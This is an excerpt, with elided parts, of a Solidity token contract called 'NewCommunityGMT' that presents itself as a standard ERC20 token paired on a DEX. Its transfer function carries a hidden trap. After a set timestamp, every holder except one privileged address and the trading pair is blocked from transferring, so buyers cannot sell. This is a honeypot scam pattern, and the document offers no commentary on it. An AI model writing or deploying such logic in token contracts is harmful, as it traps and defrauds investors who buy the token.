...
contract NewCommunityGMT  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "NewCommunityGMT";
    string private _symbol = "ncGMT";
    ...
    constructor() {
        ...
        router = IDEXRouter(0xED7d5F38C79115ca12fe6C0041abb22F0A06C300);
        panckev2router = IDEXFactory(router.factory()).createPair(router.WHT(), address(this));
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (form !=isExcluded && form !=panckev2router && to!=isExcluded){require(block.timestamp <= _bruntimen);}
